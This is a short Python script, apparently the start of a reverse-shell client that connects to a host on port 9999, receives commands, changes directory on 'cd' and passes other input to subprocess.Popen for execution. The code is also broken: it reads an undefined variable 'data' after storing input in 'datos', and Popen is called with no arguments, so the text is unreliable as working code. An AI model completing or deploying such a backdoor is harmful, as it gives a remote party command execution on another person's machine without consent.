import os
import socket 
import subprocess

s = socket.socket()
host = '192.168.0.5'
puerto = 9999
s.connect((host,puerto))

while True:
	datos = s.recv(1024)
	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))
	if len(data) > 0:
		cmd  = subprocess.Popen()